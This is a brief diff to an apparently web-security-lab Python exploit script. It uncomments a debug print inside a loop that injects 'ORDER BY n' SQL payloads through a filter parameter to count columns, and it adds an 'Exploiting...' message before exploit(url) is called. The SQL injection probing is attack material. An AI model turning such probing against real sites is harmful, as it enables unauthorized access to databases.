@@ -28,7 +28,7 @@ def find_number_of_columns(base_url):
         num_of_col = 0
         for i in range(1, 50):
             uri = f"{FILTER}'ORDER BY {i} {comment}"
-            # print(base_url + uri)
+            print(base_url + uri)
             r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
             if r.status_code != 200:
                 num_of_col = i - 1
@@ -221,4 +221,5 @@ if __name__ == "__main__":
         print(f'[-] Example: {sys.argv[0]} www.google.com"')
         sys.exit(-1)
 
+    print("[*] Exploiting...")    
     exploit(url)
